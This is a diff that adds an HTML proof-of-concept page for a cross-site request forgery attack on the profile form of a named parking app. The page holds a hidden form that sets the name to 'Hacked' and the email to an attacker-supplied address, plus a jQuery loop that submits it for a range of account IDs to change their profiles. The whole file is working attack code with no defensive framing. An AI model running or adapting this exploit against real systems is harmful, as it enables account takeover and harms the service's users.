@@ -1,0 +1,48 @@
+<html>
+<body>
+
+    <!-- JQuery -->
+    <script src="https://code.jquery.com/jquery-3.1.1.min.js" integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8=" crossorigin="anonymous"></script>
+
+    <!-- Info -->
+    <output id="result"></output>
+
+    <input type="button" value="Hack!" id="trigger">
+
+    <!-- Model form -->
+    <form method="POST" action="https://app.telpark.com/es/my_profile?XXX-1.IFormSubmitListener-form" id="form">
+        <input type="hidden" name="submitform" value="x">
+        <input type="hidden" name="name-surname-container:name_surname" value="Hacked">
+        <input type="hidden" name="email-container:email" value="CHANGE ME">
+        <input type="hidden" name="country" value="ES">
+        <input type="hidden" name="language" value="es">
+    </form>
+
+    <script type="text/javascript">
+
+        $("#trigger").click(function() {
+            var start = 5;
+            var end = 20;
+
+            for (i=start; i<=end; i++) {
+                sendform(i);
+            }
+        });
+
+        function sendform(id){
+            url = $('#form').attr('action');
+            $.ajax({
+                type: 'POST',
+                async: true,
+                url: url.replace("XXX", id),
+                data: $("#form").serialize(),
+                dataType : 'jsonp',
+                crossDomain: true,
+                complete: function(data, status, xhr){
+                    $("#result").append(id + ' sent...<br />');
+                }
+            });
+        }
+    </script>
+</body>
+</html>
